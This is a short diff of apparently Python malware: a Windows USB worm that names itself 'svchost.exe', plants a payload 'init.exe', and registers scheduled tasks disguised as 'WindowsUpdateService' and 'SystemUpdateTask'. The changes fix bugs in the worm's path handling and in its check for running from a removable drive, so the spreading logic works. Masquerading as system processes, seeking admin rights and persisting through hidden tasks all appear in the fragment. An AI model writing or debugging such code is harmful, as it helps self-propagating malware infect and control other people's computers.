@@ -11,7 +11,7 @@ from win32com.shell import shell
 
 WORM_NAME = "svchost.exe"
 PAYLOAD_NAME = "init.exe"
-WORM_PATH = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Templates', WORM_NAME) 
+WORM_PATH = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Templates', WORM_NAME) 
 PAYLOAD_PATH = os.path.join(os.getenv('TEMP'), PAYLOAD_NAME) 
 WORM_TASK_NAME = "WindowsUpdateService"  
 PAYLOAD_TASK_NAME = "SystemUpdateTask"  
@@ -28,6 +28,7 @@ def request_admin():
 
 def is_usb_drive():
     drive = os.path.splitdrive(os.path.abspath(sys.executable))[0]
+    drive = drive + '\\'
     for partition in psutil.disk_partitions():
         if partition.device == drive and 'removable' in partition.opts:
             return True
